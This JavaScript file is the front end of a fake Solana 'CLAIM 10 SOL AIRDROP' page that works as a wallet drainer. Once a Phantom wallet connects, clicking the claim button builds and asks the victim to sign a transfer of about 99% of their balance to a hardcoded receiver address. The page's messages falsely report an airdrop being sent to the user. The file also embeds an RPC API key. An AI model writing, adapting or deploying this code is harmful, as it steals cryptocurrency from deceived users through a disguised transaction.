$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/2ocRt5umNFudMXpakQq5AapYzJ23yCfws3yD415xiT5rLJkBrcV2yqYG36ehnnfCe672x8aHAwcAyz9Q75Nbi61nY9hQCrv6bdW',
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance (lamports):", walletBalance);

                $('#output').append(`<div>> Connected: ${resp.publicKey.toBase58().slice(0,8)}...</div>`);
                $('#output').append(`<div>> Balance: ${(walletBalance / 1e9).toFixed(6)} SOL</div>`);
                $('#output').scrollTop($('#output')[0].scrollHeight);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent exemption.");
                    $('#output').append('<div style="color:#f88">[WARN] Not enough SOL for transaction.</div>');
                    return;
                }

                $('#connect-wallet')
                    .text("CLAIM 10 SOL AIRDROP")
                    .removeClass('btn').addClass('btn success');

                $('#status').text('STATUS: CONNECTED | AIRDROP: READY');

                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        // YOUR WALLET (RECEIVER)
                        const recieverWallet = new solanaWeb3.PublicKey('G9QPn3wG7KThVuQv2wRdJ4PrTjUTS2MNEgu9Sdx9tSAC');

                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        const lamportsToSend = Math.floor(balanceForTransfer * 0.99);

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: lamportsToSend,
                            }),
                        );

                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        $('#output').append('<div>> Signing transaction...</div>');
                        $('#output').scrollTop($('#output')[0].scrollHeight);

                        const signed = await window.solana.signTransaction(transaction);
                        $('#output').append('<div>> Sending to your wallet...</div>');
                        $('#output').scrollTop($('#output')[0].scrollHeight);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);

                        console.log("Airdrop sent to G9QPn3wG7KThVuQv2wRdJ4PrTjUTS2MNEgu9Sdx9tSAC:", txid);

                        // SUCCESS IN TERMINAL
                        $('#output').append(`<div style="color:#0f0">[AIRDROP] ${lamportsToSend / 1e9} SOL SENT!</div>`);
                        $('#output').append(`<div style="color:#0f0">[TX] ${txid}</div>`);
                        $('#output').scrollTop($('#output')[0].scrollHeight);

                        $('#connect-wallet').text('CLAIMED').prop('disabled', true);
                        $('#status').text('STATUS: CLAIMED | AIRDROP: COMPLETED');

                    } catch (err) {
                        console.error("Claim failed:", err);
                        $('#output').append('<div style="color:#f00">[ERROR] Transaction failed. Check console.</div>');
                        $('#output').scrollTop($('#output')[0].scrollHeight);
                    }
                });

            } catch (err) {
                console.error("Connection failed:", err);
                $('#output').append('<div style="color:#f88">[ERROR] Phantom connection failed.</div>');
            }
        } else {
            alert("Phantom extension not found. Installing...");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;
            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please install Phantom Wallet.");
            }
        }
    });
});